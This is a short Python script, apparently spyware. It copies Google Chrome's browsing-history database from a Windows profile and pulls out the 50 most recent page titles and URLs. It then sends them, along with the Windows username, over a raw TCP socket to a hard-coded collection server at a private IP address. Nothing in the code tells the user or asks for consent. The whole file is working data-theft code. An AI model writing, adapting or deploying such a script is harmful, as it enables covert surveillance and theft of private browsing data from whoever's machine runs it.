import socket
import os
import shutil
import sqlite3
import time
import getpass

SERVER_IP = '192.168.228.128'  # Replace with your server IP
SERVER_PORT = 9999

def get_chrome_history():
    history_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')
    temp_copy = 'History_copy'

    try:
        shutil.copy2(history_path, temp_copy)
    except Exception as e:
        print(f"Error copying history file: {e}")
        return []

    urls = []
    try:
        conn = sqlite3.connect(temp_copy)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        rows = cursor.fetchall()
        for url, title, visit_time in rows:
            urls.append(f"{title} | {url}")
        conn.close()
    except Exception as e:
        print(f"Error reading history DB: {e}")

    try:
        os.remove(temp_copy)
    except:
        pass

    return urls

def send_history_to_server(username, urls):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            # First send username line
            s.sendall(f"USER:{username}\n".encode('utf-8'))
            time.sleep(0.05)

            # Send history entries
            for entry in urls:
                s.sendall(entry.encode('utf-8') + b'\n')
                time.sleep(0.05)

            s.sendall(b'__END__\n')  # signal end of transmission
        print("[*] History sent successfully.")
    except Exception as e:
        print(f"Error sending to server: {e}")

if __name__ == "__main__":
    username = getpass.getuser()  # Gets Windows username
    history_entries = get_chrome_history()
    if history_entries:
        send_history_to_server(username, history_entries)
    else:
        print("No history entries found.")
